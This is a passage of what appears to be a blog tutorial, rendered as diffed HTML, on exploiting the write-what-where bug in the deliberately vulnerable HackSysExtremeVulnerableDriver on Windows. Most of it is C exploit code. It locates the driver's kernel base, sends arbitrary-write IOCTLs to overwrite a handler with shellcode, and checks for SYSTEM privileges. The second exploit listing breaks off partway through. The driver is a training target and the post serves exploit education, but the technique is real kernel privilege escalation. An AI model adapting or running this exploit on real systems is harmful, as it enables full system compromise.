+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ARBITRARY_WRITE 0x22200b
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Write-What-Where */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _WRITE_WHAT_WHERE
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>ullpWhat;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>ullpWhere;
+</span></span><span style="display:flex;"><span>} WRITE_WHAT_WHERE, <span style="color:#f92672">*</span>PWRITE_WHAT_WHERE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">GetKernelModuleBase</span>(PCHAR pKernelModule)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> pcDriver[<span style="color:#ae81ff">1024</span>]    <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  LPVOID lpvTargetDriver <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpvDrivers     <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD dwCB             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwDrivers        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD i                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, dwCB, <span style="color:#f92672">&amp;</span>dwCB);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwCB <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvDrivers <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwCB <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(LPVOID));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvDrivers <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(lpvDrivers, dwCB, <span style="color:#f92672">&amp;</span>dwCB))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    dwDrivers <span style="color:#f92672">=</span> dwCB <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(LPVOID);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDrivers; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseNameA</span>(lpvDrivers[i], pcDriver, <span style="color:#66d9ef">sizeof</span>(pcDriver)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pcDriver, pKernelModule) <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>          lpvTargetDriver <span style="color:#f92672">=</span> lpvDrivers[i];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(lpvDrivers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> lpvTargetDriver;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">WriteBytes</span>(HANDLE hHEVD, <span style="color:#66d9ef">uint64_t</span> ullWhat, <span style="color:#66d9ef">uint64_t</span> ullWhere)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  WRITE_WHAT_WHERE www <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  www.ullpWhere <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)ullWhere;
+</span></span><span style="display:flex;"><span>  www.ullpWhat <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>ullWhat;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Writing 0x%p to 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>www.ullpWhat, www.ullpWhere);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  ARBITRARY_WRITE,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>www,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(WRITE_WHAT_WHERE),
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  LPVOID pHEVDBase         <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD i                  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwShellcodeLength  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ullTarget       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ullRawBytes     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  CHAR cRawBytes[<span style="color:#ae81ff">60</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  CHAR shellcode[]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90\x90\x90\x90\x42</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  dwShellcodeLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((dwShellcodeLength <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Shellcode must be divisible by 8</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  pHEVDBase <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;HEVD&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (pHEVDBase <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Obtained the base address of HEVD: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHEVDBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ullTarget <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)pHEVDBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x85b14</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwShellcodeLength; i <span style="color:#f92672">+=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sprintf</span>(cRawBytes, <span style="color:#e6db74">&#34;0x%02x%02x%02x%02x%02x%02x%02x%02x&#34;</span>, ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ullRawBytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoull</span>(cRawBytes, NULL, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WriteBytes</span>(hHEVD, ullRawBytes, ullTarget);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(cRawBytes, <span style="color:#e6db74">&#39;\0&#39;</span>, <span style="color:#ae81ff">60</span>);
+</span></span><span style="display:flex;"><span>    ullTarget <span style="color:#f92672">+=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Exploit</span>(hHEVD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Let&rsquo;s test this.</p>
+<p><img src="/0x04-Introduction-To-Windows-Kernel-Write-What-Where/poc1.png" alt="alt text"></p>
+<p>Once sent we can see we have successfully triggered the arbitrary write :)</p>
+<p><img src="/0x04-Introduction-To-Windows-Kernel-Write-What-Where/poc.png" alt="alt text"></p>
+<h2 id="exploitation-1">Exploitation</h2>
+<p>After some tinkering I was able to write a fully functioning exploit that can be seen below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ARBITRARY_WRITE 0x22200b
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define TARGET_FUNCTION 0x22206f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Write-What-Where */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _WRITE_WHAT_WHERE
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>ullpWhat;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>ullpWhere;
+</span></span><span style="display:flex;"><span>} WRITE_WHAT_WHERE, <span style="color:#f92672">*</span>PWRITE_WHAT_WHERE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GetKernelModuleBase():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Function used to obtain kernel module address */</span>
+</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">GetKernelModuleBase</span>(PCHAR pKernelModule)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> pcDriver[<span style="color:#ae81ff">1024</span>]    <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  LPVOID lpvTargetDriver <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpvDrivers     <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD dwCB             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwDrivers        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD i                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, dwCB, <span style="color:#f92672">&amp;</span>dwCB);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwCB <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvDrivers <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwCB <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(LPVOID));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvDrivers <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(lpvDrivers, dwCB, <span style="color:#f92672">&amp;</span>dwCB))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    dwDrivers <span style="color:#f92672">=</span> dwCB <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(LPVOID);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDrivers; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseNameA</span>(lpvDrivers[i], pcDriver, <span style="color:#66d9ef">sizeof</span>(pcDriver)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pcDriver, pKernelModule) <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>          lpvTargetDriver <span style="color:#f92672">=</span> lpvDrivers[i];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(lpvDrivers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> lpvTargetDriver;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* WriteBytes():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     This function triggers the Write-What-Where vulnerability */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">WriteBytes</span>(HANDLE hHEVD, <span style="color:#66d9ef">uint64_t</span> ullWhat, <span style="color:#66d9ef">uint64_t</span> ullWhere)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  WRITE_WHAT_WHERE www <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  www.ullpWhere <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)ullWhere;
+</span></span><span style="display:flex;"><span>  www.ullpWhat <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>ullWhat;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Writing 0x%p to 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>www.ullpWhat, www.ullpWhere);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  ARBITRARY_WRITE,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>www,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(WRITE_WHAT_WHERE),
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Arbitrary Write */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  LPVOID pHEVDBase         <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD i                  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwShellcodeLength  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ullTarget       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ullRawBytes     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
